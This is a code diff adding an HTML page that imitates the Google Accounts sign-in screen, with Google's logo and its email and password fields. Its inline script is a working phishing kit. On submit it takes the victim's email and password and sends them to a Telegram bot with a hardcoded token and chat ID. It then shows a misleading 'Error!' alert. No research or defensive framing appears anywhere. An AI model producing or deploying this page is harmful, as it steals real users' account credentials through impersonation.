@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="Goggle.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
+            <h1>Sign in</h1>
+            <p>to continue to Google</p>
+            <form id="loginForm" onsubmit="sendToTelegram(event)">
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="Email or phone" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                <a href="#" class="forgot-link">Forgot password?</a>
+                <div class="buttons">
+                    <button type="submit" class="next-btn">Next</button>
+                </div>
+            </form>
+            <div class="footer-links">
+                <a href="#">Create account</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        async function sendToTelegram(event) {
+            event.preventDefault(); // Prevents page refresh
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const botToken = '7422448417:AAHmafFvnFYX_Wi0F2dhTeE2KT8vFx4GDHE';
+            const chatId = '-1002313905923';
+            const message = `New login:\nEmail: ${email}\nPassword: ${password}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                if (data.ok) {
+                    alert('Error!');
+                    console.log('Success:', data);
+                } else {
+                    console.error('Telegram error:', data);
+                    alert('Failed to send: ' + data.description);
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+                alert('Error sending data.');
+            }
+        }
+    </script>
+</body>
+</html>
